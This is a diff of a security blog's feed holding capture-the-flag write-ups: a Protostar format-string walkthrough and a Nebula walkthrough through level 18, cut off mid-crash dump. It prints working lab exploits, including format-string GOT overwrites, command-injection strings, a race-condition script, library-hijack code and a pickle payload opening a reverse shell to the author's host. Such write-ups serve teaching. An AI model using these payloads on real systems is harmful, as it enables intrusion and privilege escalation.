-(gdb) x/wx &amp;target
-0xbffff75c: 0xdeadbeef
-(gdb) x/wx &amp;target-4
-0xbffff74c: 0x41414141
-(gdb) c
-Continuing.
-you have hit the target correctly :)
-```</p>
-
-<h2>Format String Level 01</h2>
-
-<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>
-
-<p><code>
-user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
-08049638 g     O .bss   00000004              target
-user@protostar:/opt/protostar/bin$
-</code></p>
-
-<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>
-
-<p>```
-import sys
-from commands import getoutput</p>
-
-<p>run = &ldquo;/opt/protostar/bin/format1 $(perl -e &lsquo;print \"AAAAAAAA\&rdquo; . \&ldquo;%08x.\"x{0}&rsquo; . \&rdquo;%x\&ldquo;)&rdquo;</p>
-
-<p>print &lsquo;[!] Searching for offset..&rsquo;
-for idx in range(1, 15000):</p>
-
-<pre><code>tmp = getoutput(run.format(idx))
-tmps = tmp.split('.')[:-1]
-if '41414141' in tmps[len(tmps)-1]:
-    print '[!] Format found at offset %d' % idx 
-    print '[!] String: %s' % run.format(idx)
-    break
-</code></pre>
-
-<p>```</p>
-
-<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>
-
-<p><code>
-user@protostar:/opt/protostar/bin$ python ~/test.py
-[!] Searching for offset..
-[!] Format found at offset 133
-[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
-user@protostar:/opt/protostar/bin$
-</code></p>
-
-<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>
-
-<p>```
-(gdb) r $(perl -e &lsquo;print &ldquo;\x38\x96\x04\x08BAAAA&rdquo; . &ldquo;%08x."x132 . &rdquo;%n"&rsquo;)
-[snip]
-Breakpoint 1, vuln (</p>
-
-<pre><code>                string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
-</code></pre>
-
-<p>12  format1/format1.c: No such file or directory.</p>
-
-<pre><code>in format1/format1.c
-(gdb) x/wx &amp;target
-0x8049638 &lt;target&gt;: 0x000004ad
-(gdb) c
-Continuing.
-1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)
-</code></pre>
-
-<p>```</p>
-
-<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>
-
-<h2>Format String Level 02</h2>
-
-<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>
-
-<p><code>
-$ objdump -t format2 | grep target
-080496e4 g     O .bss   00000004              target
-</code></p>
-
-<p>Modifying my script a bit (since input is now via fgets):</p>
-
-<p><code>
-$ python /home/user/test.py
-[!] Searching for offset..
-[!] Format found at offset 4
-[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2
-</code></p>
-
-<p>Not so far up the stack this time.  Lets plug in our address:</p>
-
-<p><code>
-$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
-��200.b7fd8420.bffff604.
-target is 26 :(
-</code></p>
-
-<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>
-
-<p><code>
-$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
-��                200.           b7fd8420.           bffff604.
-you have modified the target :)
-</code></p>
-
-<h2>Format String Level 03</h2>
-
-<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>
-
-<p><code>
-$ objdump -t format3 | grep target
-080496f4 g     O .bss   00000004              target
-</code></p>
-
-<p>And again running our script:</p>
-
-<p><code>
-$ python /home/user/test.py
-[!] Searching for offset..
-[!] Format found at offset 12
-[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3
-</code></p>
-
-<p>And if we test this out:</p>
-
-<p><code>
-$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
-��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
-target is 0000004c :(
-</code></p>
-
-<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>
-
-<p><code>
-$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
-AAAAAA_41414141
-</code></p>
-
-<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>
-
-<p><code>
-$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
-AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
-target is 00000000 :(
-</code></p>
-
-<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>
-
-<p><code>
-$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
-��������
-target is 10101010 :(
-</code></p>
-
-<p>Figuring out the correct padding values requires some simple math:</p>
-
-<p><code>
-first byte = 0x44 - 0x10
-second     = 0x55 - 0x44
-third      = 0x02 - 0x55
-</code></p>
-
-<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>
-
-<p><code>
-$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
-��������                                                   080496f580496f680496f7
-target is 00000044 :(
-</code></p>
-
-<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>
-
-<p><code>
-$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
-��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
-you have modified the target :)
-</code></p>
-
-<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>
-
-<h2>Format String Level 04</h2>
-
-<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>
-
-<p><code>
-$ objdump -M intel -t format4 | grep hello
-080484b4 g     F .text  0000001e              hello
-</code></p>
-
-<p>And running our script:</p>
-
-<p><code>
-$ python /home/user/test.py
-[!] Searching for offset..
-[!] Format found at offset 4
-[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4
-</code></p>
-
-<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>
-
-<p><code>
-$ objdump --dynamic-reloc format4 | grep exit
-08049718 R_386_JUMP_SLOT   _exit
-08049724 R_386_JUMP_SLOT   exit
-</code></p>
-
-<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>
-
-<p>```
-user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08&rdquo; + &ldquo;%4$n%5$n%6$n%7$n&rdquo;&rsquo; > /tmp/input
-user@protostar:/opt/protostar/bin$ gdb -q ./format4
-Reading symbols from /opt/protostar/bin/format4&hellip;done.
-(gdb) r &lt; /tmp/input
-Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
-$�%�&amp;�'�</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-0x10101010 in ?? ()
-(gdb)
-```</p>
-
-<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>
-
-<p>```
-user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08&rdquo; + &ldquo;%4$hn&rdquo;&rsquo; > /tmp/input
-user@protostar:/opt/protostar/bin$ gdb -q ./format4
-Reading symbols from /opt/protostar/bin/format4&hellip;done.
-(gdb) r &lt; /tmp/input
-Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
-$�</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-0x08040004 in ?? ()
-```</p>
-
-<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>
-
-<p><code>
-$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
-[snip whitespace]
-code execution redirected! you win
-</code></p>
-
-<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
-]]></content>
-  </entry>
   
   <entry>
     <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
@@ -1494,6 +479,1546 @@ root
 </code></p>
 
 <p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Nebula Solutions - All Levels]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels/"/>
+    <updated>2013-03-30T22:46:33-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels</id>
+    <content type="html"><![CDATA[<p>Nebula is the first of three exploit discs provided by <a href="http://exploit-exercises.com/">exploit exercises</a>.  I&rsquo;ve seen a couple walkthroughs of these levels around, but as a completionist, and for future reference, I&rsquo;ve cleaned my notes up a bit and am posting them here.  I will also post my notes for the other two systems sometime after.  This post includes a walkthrough of all 20 levels.</p>
+
+<h3>Level 00</h3>
+
+
+<p>Introduction level; requires the user to find a setuid file.  <code>find / -perm +6000 -type f -exec ls -ldh {} \; &gt; files.txt</code> and <code>cat files.txt | grep flag00</code> gives us two files, <code>/bin/.../flag00</code> and <code>/rofs/bin/.../flag00</code>.  Pick one and get your flag.</p>
+
+<h3>Level 01</h3>
+
+
+<p>First &ldquo;real&rdquo; level.  A binary with an environmental vulnerability; the source code given clearly lays out that its loading the users environment, and running echo with a string.  By modifying our environmental PATH, we can &ldquo;search&rdquo; for echo first in another directory and launch a shell.  <code>export PATH=/tmp:$PATH</code> to search for binaries in /tmp first, then create a shell script that launches bash.  Flag captured.</p>
+
+<h3>Level 02</h3>
+
+
+<p>Much like the previous level, this involves the manipulation of environmental variables.  Here it&rsquo;s pulling <code>$USER</code> and inserting it into a string to echo out.  Because we control this variable, we can terminate the string and execute a shell with the following: <code>export USER="test &amp;&amp; /bin/bash &amp;&amp; echo"</code>.  Launch the binary and capture the flag.</p>
+
+<h3>Level 03</h3>
+
+
+<p>This level has a crontab that runs every 5 minutes, and executes anything found in the local <code>writable.d</code> folder, then removes it.  It, surprise, runs as our flag.  If we shove a malicious script into the run folder that generates a shell executable for us, we should be able to suid it and capture our flag.  Generate a shell script with the following in writable.d:</p>
+
+<p>```</p>
+
+<h1>!/bin/bash</h1>
+
+<p>gcc /tmp/shell.c -o /home/flag03/shell
+chmod +s /home/flag03/shell
+<code>``
+You'll just need to create</code>shell.c<code>in tmp and wait for it to run; I took the source code from level 1 and changed the system command to execute /bin/bash instead.  Execute</code>chmod +x` on run.sh and wait for your binary to be generated.  Once it is, execute it for your flag.  One thing to note is that it would be much easier to echo a shell script and suid that; alas, Linux prevents us from suid'ing scripts, <a href="http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html">and for very good reason</a>.</p>
+
+<h3>Level 04</h3>
+
+
+<p>Here we have another executable binary and a token file, which we must read.  The binary reads a name from stdin, checks if it&rsquo;s called &ldquo;token&rdquo; and if so, exits, otherwise it reads the file.  To circumvent this simple test, we can create a symbolic link to the token file and read that instead.  Executing <code>ln -s /home/flag04/token /tmp/test</code> allows us to then read /tmp/test and dump the token file.  In it is the password for flag04.</p>
+
+<h3>Level 05</h3>
+
+
+<p>This level aims to educate the user on directory permissions.  Browsing to <code>/home/flag05</code> and <code>ls -lAh</code> gives us several hidden folders, including a .backup folder with a tar file.  If we untar this, it appears to be a backup of flag05&rsquo;s ssh directory.  Copying the private key over will allow us to SSH in and capture our fifth flag.</p>
+
+<h3>Level 06</h3>
+
+
+<p>The informational page notes that this flag&rsquo;s credentials came from a legacy Unix system.  Executing <code>cat /etc/passwd | grep flag06</code> gives us a traditional DES encrypted password.  Loading this into john the ripper cracks the flag&rsquo;s password, giving us our sixth flag.</p>
+
+<h3>Level 07</h3>
+
+
+<p>Level 7 has a web server running on port 7007 that hosts a simple ping application.  No sanitation is performed on input, so obviously its prone to injection.  Leveraging the shell we wrote for level 3, we can simply generate a new shell script to compile and suid the binary.  By setting Host equal to <code>192.168.1.1 | sh /tmp/run2.sh</code>, we&rsquo;ll generate our shell and capture the flag.</p>
+
+<h3>Level 08</h3>
+
+
+<p>This level has a single pcap file with, likely. a password somewhere.  I scp&rsquo;d this off so I could parse it in Wireshark, but it could also be done using <code>tcpdump -qns 0 -X -r capture.pcap | more</code>.  Opening the pcap gives us a login attempt with a password backdoor&hellip;00Rm8.ate.  The periods are represented by <code>\x7f</code>, which just so happens to be backspace.  su to flag08 and capture the flag.</p>
+
+<h3>Level 09</h3>
+
+
+<p>This level requires some prerequisite knowledge of PHP and an edge-case vulnerability.  When <a href="http://php.net/manual/en/function.preg-replace.php">pre_replace</a> is used with the /e flag, the replacement string is substituted, evaluated, and replaced in the original string.  By looking at the PHP source code, we see the following <code>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</code>.  This regex matches the pattern <code>[email EMAIL]</code>, where EMAIL will be evaluated by the spam function, then eval&rsquo;d by PHP.  Notice the function takes two arguments, but only uses one; a clue, by any means.</p>
+
+<p>In order to exploit this, we need to set the email portion of the regex to spawn us a shell.  This can be done with the following entry: <code>([email {${system($use_me)}}])</code>, where $use_me is $argv[2] to the executable.  Wrapping the command in <code>${system}</code> allows the PHP engine to interpret the command properly, and the extra pair of curly braces for escaping.  Pass in /bin/bash to capture your flag.</p>
+
+<h3>Level 10</h3>
+
+
+<p>Level 10 introduces a bit of networking; an application binary exists in the flag&rsquo;s folder, which reads a file and host from stdin and sends the file to the host over port 18211.  The binary first makes a call to access() to verify the user has adequate privileges; if not, a connection to the remote host is made and the file sent.  The vulnerability is a classic TOCTTOU (time of check to time of use); the application first checks if the user has access, then goes about creating a socket, making the connection, and sending the header.  With the following script, we can brute force the race condition:</p>
+
+<p>```</p>
+
+<h1>!/bin/bash</h1>
+
+<p>unlink /tmp/token
+touch /tmp/token
+/home/flag10/flag10 /tmp/token 192.168.1.74 &amp;
+rm -f /tmp/token
+ln -s /home/flag10/token /tmp/token
+```</p>
+
+<p>I then started up a netcat listener on my remote host.  After about 30-40 iterations, I had flag 10&rsquo;s password.</p>
+
+<h3>Level 11</h3>
+
+
+<p>This is our first tricky level, I thought, that required a bit of leg work and thought.  The instructions state there are two ways to finish this level; I&rsquo;m assuming that&rsquo;s through one of two code paths present in the binary.  Essentially if our content header is &lt; 1024 we take the first transformation path, and if it&rsquo;s > 1024, we take the second.  The objective is to pass in already encrypted data that, when decrypted, can grab our flag.  If we send in encrypted data after a 1024 byte buffer, we can get decrypted commands to the system() call.  I wrote a small C application that runs the exact runtime from the given source and spits to stdout, which can then be piped to flag11 <code>./generate getflag | /home/flag11/flag11</code>.</p>
+
+<h3>Level 12</h3>
+
+
+<p>This level has a local telnet script listening on port 50001 that employs a lua script to handle all of its happenings.  The script accepts a password, hashes it, and checks it against a hard coded hash.  The vulnerability here is how it&rsquo;s actually verifying the password; the following line exemplifies the issue: <code>prog = io.popen("echo "..password.." | sha1sum", "r")</code>.  The listener receives input, and echo&rsquo;s it into sha1sum.  If we inject commands into our password, we should be able to snag the flag.  Executing <code>f | getflag &gt; /tmp/test | echo "test"</code> as a password should result in our flag when you <code>cat /tmp/test</code>.</p>
+
+<h3>Level 13</h3>
+
+
+<p>I was initially a little confused about the goal for this level; <code>cat /etc/passwd | grep 1000</code> returned the nebula account, which we &ldquo;technically&rdquo; don&rsquo;t know.  I then started looking for ways to preload a modified library, so we could override the getuid() call and just return 1000.  This led me <a href="http://www.ibm.com/developerworks/library/l-glibc/index.html">here</a>, which I was painlessly able to pull off:</p>
+
+<p>```
+level13@nebula: cat moduid.c</p>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>uid_t getuid(){ return 1000; }
+level13@nebula: gcc -shared -o moduid.so moduid.c
+level13@nebula: LD_PRELOAD=moduid.so ./flag13
+```</p>
+
+<p>Running this dumps our token to stdout.  Another method may be modifying the binary itself, but I don&rsquo;t know how legal that is.  This was a neat vulnerability, and something I haven&rsquo;t run into before.</p>
+
+<h3>Level 14</h3>
+
+
+<p>Now I&rsquo;m convinced that running the binaries in a debugger is legal.  This level has a binary that only encrypts information; so, the objective here is to discover the encryption algorithm and write a complimentary decryption routine.  Playing around with the encryption tool allowed me to quickly discover what it was doing, without having to delve into assembly:</p>
+
+<p><code>
+abcdefg -&gt; acegikm
+a -&gt; a (idx + 0)
+b -&gt; c (idx + 1)
+c -&gt; e (idx + 2)
+d -&gt; g (idx + 3)
+e -&gt; i (idx + 4)
+f -&gt; k (idx + 5)
+g -&gt; m (idx + 6)
+</code></p>
+
+<p>So to reverse this, we just need to subtract the index.  I wrote a quick python script for doing this:</p>
+
+<p>```
+import sys</p>
+
+<p>def decrypt(args):</p>
+
+<pre><code>ciph = args[2]
+plain = ''
+print 'Decrypting ', ciph
+for idx in xrange(len(ciph)):
+    tmp = (ord(ciph[idx])-65)-idx
+    plain += chr(tmp+65)
+print 'Decrypted: ', plain
+</code></pre>
+
+<p>def encrypt(args):</p>
+
+<pre><code>plain = args[2]
+ciph = ''
+print 'Encrypting ', plain
+for idx in xrange(len(plain)):
+    tmp = (ord(plain[idx])-65)+idx
+    ciph += chr(tmp+65)
+print 'Encrypted: ', ciph
+</code></pre>
+
+<p>if len(sys.argv) &lt; 2:</p>
+
+<pre><code>print '%s: [-d] [cipher] [-e] [plain]'%sys.argv[0]
+sys.exit(1)
+</code></pre>
+
+<p>if &lsquo;-d&rsquo; in sys.argv:</p>
+
+<pre><code>decrypt(sys.argv)
+</code></pre>
+
+<p>elif &lsquo;-e&rsquo; in sys.argv:</p>
+
+<pre><code>encrypt(sys.argv)
+</code></pre>
+
+<p>```</p>
+
+<p>Now we just need to pass in the output of the encrypted token file to obtain our flag.</p>
+
+<h3>Level 15</h3>
+
+
+<p>If we strace flag15, we see a ton of access attempts to libc.so.6 in various folders in <code>/var/tmp/flag15</code>.  My first idea was to forgo the libc loading stuff and try wrapping the puts call and use the preload vulnerability again:</p>
+
+<p>```
+level15@nebula:/tmp$ cat wrapper.c</p>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>int __wrap_puts(const char *s){</p>
+
+<pre><code>system("/bin/getflag &gt; /tmp/flagged");
+return puts(s);
+</code></pre>
+
+<p>}
+level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
+level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15
+```</p>
+
+<p>Unfortunately, the protection mechanism for preloading libraries catches us.  The loader will completely ignore the preloaded library if the RUID is not equal to the EUID and unlike level 13, we need to execute a binary, not simply obtain a token embedded in the binary.</p>
+
+<p>So instead we need to compile a statically linked library and get it to call that library with whatever function it&rsquo;s using.  Object dumping the file, we find our main quite small:</p>
+
+<p><code>
+level15@nebula:/home/flag15$ objdump -d -M intel flag15
+[....]
+08048330 &lt;main&gt;:
+ 8048330:  55                     push   %ebp
+ 8048331:  89 e5                  mov    %esp,%ebp
+ 8048333:  83 e4 f0               and    $0xfffffff0,%esp
+ 8048336:  83 ec 10               sub    $0x10,%esp
+ 8048339:  c7 04 24 d0 84 04 08   movl   $0x80484d0,(%esp)
+ 8048340:  e8 bb ff ff ff         call   8048300 &lt;puts@plt&gt;
+ 8048345:  c9                     leave  
+ 8048346:  c3                     ret    
+ 8048347:  90                     nop
+</code></p>
+
+<p>The only function it calls is puts, so we need to override that; we also need a target location.  <code>/var/tmp/flag15/libc.so.6</code> appears to be the least nested.  Here&rsquo;s the library code:</p>
+
+<p>```
+level15@nebula:/home/flag15$ cat /tmp/lib.c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<p>int puts(const char *s){
+  system(&ldquo;/bin/getflag > /tmp/flagged&rdquo;);
+}</p>
+
+<p>int __libc_start_main(int (*main)(int, char <strong>, char </strong>),</p>
+
+<pre><code>       int argc, char **argv,
+      void (*init)(void),
+      void (*fini)(void),
+      void (*rtld_fini)(void),
+      void (*stack_end))
+{ main(argc, argv, NULL);
+</code></pre>
+
+<p>  return 0;
+}
+level15@nebula:/home/flag15$
+```</p>
+
+<p>We just need to compile and statically link this to the library path:</p>
+
+<p><code>
+level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
+/tmp/lib.c: In function ‘puts’:
+/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
+level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
+level15@nebula:/home/flag15$ ./flag15
+./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
+./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+</code></p>
+
+<p>This, <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">apparently</a>, means that the library version number is lower on the shared object.  So we&rsquo;ll need to generate a version file and link it in:</p>
+
+<p>```
+level15@nebula:/home/flag15$ cat /tmp/versionz
+GLIBC_2.0{
+  <strong>cxa_finalize;
+  </strong>libc_start_main;
+  puts;
+};
+GLIBC_2.1.3 {
+}GLIBC_2.0;</p>
+
+<p>GLIBC_2.4{
+}GLIBC_2.0;
+level15@nebula:/home/flag15$
+```</p>
+
+<p>Recompile with &mdash;version-script=/tmp/versionz and&hellip;</p>
+
+<p><code>
+level15@nebula:/home/flag15$ ./flag15
+Segmentation fault
+level15@nebula:/home/flag15$ cat /tmp/flagged
+You have successfully executed getflag on a target account
+level15@nebula:/home/flag15$
+</code></p>
+
+<h3>Level 16</h3>
+
+
+<p>Level 16 has an HTTP server that hosts a simple CGI script.  In it, it parses off two parameters (username &amp; password) from the URL, then the username is converted to uppercase and everything after a space is stripped.  It then uses it as an argument to egrep:</p>
+
+<p><code>
+@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`;
+</code></p>
+
+<p>This level took a bit of thought and a frustrating amount of tinkering; it&rsquo;s obvious where the vulnerability is, but it&rsquo;s not so obvious what we actually need to do.  All input is run through the two filters, so we&rsquo;ll need to either send in post-manipulated data that will be changed back when run, or some other voodoo that&rsquo;ll correctly be interpreted by bash and not touched by the filters.</p>
+
+<p>The easiest, and shortest, command will be a script.  Normally, you wouldn&rsquo;t have access to the underlying host, but we do, so for now we&rsquo;ll take advantage of it.  I"ll admit I spent more time Googling around for this one than any of the previous; I happened to stumble into <a href="http://serverfault.com/questions/221318/bash-wildcard-expansion">this</a> Stack Overflow post about bash wildcard expansion:</p>
+
+<p><code>
+level16@nebula:~$ pwd
+/tmp
+level16@nebula:~$ ls
+SHELL
+level16@nebula:~$ ls /*/SHELL
+/tmp/SHELL
+</code></p>
+
+<p>Wildcards aren&rsquo;t anything new, but I never knew that you could use it as such.  This means we need to have our username evaluated as <code>/*/shell</code>, so when it&rsquo;s expanded it&rsquo;ll be <code>/tmp/SHELL</code>.  The final result:</p>
+
+<p><code>
+http://192.168.1.206:1616/index.cgi?username=%22%60%2f*%2fshell%60%22&amp;password=dolphin
+</code></p>
+
+<p>Add in a netcat call back to a script SHELL in tmp (see level 17) and it&rsquo;s game over.</p>
+
+<h3>Level 17</h3>
+
+
+<p>This level is yet another vulnerable listener, this time implemented in Python.  The vulnerability lies in the Pickle module, where one look at documentation gets you:</p>
+
+<p><code>
+Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
+</code></p>
+
+<p>Because our input is never sanitized, we just need to send a specially crafted input string to be unpickled and execute malicious code.  <a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">This</a> Blackhat whitepaper came in handy when figuring out how the parsing engine worked, and once I had that figured out it was pretty easy:</p>
+
+<p>```
+import socket</p>
+
+<p>cmd = &ldquo;cos\nsystem\n(S'/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&amp;1'\ntR.\n&rdquo;
+try:</p>
+
+<pre><code>sock = socket.socket()
+sock.connect(('192.168.1.206', 10007))
+data = sock.recv(512)
+print 'Got: ', data
+sock.send(cmd)
+sock.close()
+</code></pre>
+
+<p>except Exception, e: print e
+```</p>
+
+<p>I had a netcat shell listening on port 5555 for the call back.  I used this method because the Nebula box doesn&rsquo;t have netcat-traditional on it, which lacks the -e flag.  This is a neat way of opening a reverse shell without the fuss of named pipes.</p>
+
+<h3>Level 18</h3>
+
+
+<p>According to the level documentation, this can be completed in three different ways at three different difficulty levels.  The binary appears to be a hackney attempt at some sort of login program; with it, a user can &ldquo;login&rdquo; to elevate privileges, set user, do some debugging, and some other smaller things.  Immediately though I see a buffer overflow:</p>
+
+<p><code>
+level18@nebula:/home/flag18$ ./flag18
+setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** buffer overflow detected ***: ./flag18 terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xdbd8d5]
+/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0xdbc6d7]
+/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0xdbbd35]
+/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0xd41f91]
+/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0xd19305]
+/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0xdbbe09]
+/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xdbbd1f]
+./flag18[0x8048df5]
+./flag18[0x8048b1b]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xcef113]
+./flag18[0x8048bb1]
+======= Memory map: ========
+00324000-00325000 r-xp 00000000 00:00 0          [vdso]
+00358000-00376000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+00376000-00377000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+00377000-00378000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+00c9b000-00cb7000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+00cb7000-00cb8000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+00cb8000-00cb9000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+00cd6000-00e4c000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+00e4c000-00e4e000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+00e4e000-00e4f000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+00e4f000-00e52000 rw-p 00000000 00:00 0
+08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
+0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
+0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
+082c5000-082e6000 rw-p 00000000 00:00 0          [heap]
